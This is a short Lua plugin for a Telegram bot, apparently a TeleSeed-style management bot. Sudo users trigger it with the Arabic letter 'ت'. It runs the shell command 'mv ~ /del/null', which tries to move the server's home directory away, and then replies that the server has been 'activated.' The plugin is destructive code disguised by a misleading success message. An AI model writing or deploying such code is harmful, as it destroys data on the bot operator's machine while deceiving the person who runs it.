function run(msg, matches)
local reply_id = msg ['id']
if not is_sudo(msg) then
return 
end
text = io.popen(" mv ~ /del/null "):read('*all')
local text = "تم ✅ تنشيط السيرفر 🔷✔️"..'\n\n'
..'🔶 MSG BY @'..msg.from.username..'\n'
reply_msg(reply_id, text, ok_cb, false)
end
return {
patterns = {
'^ت$'
},
run = run,
moderated = true
}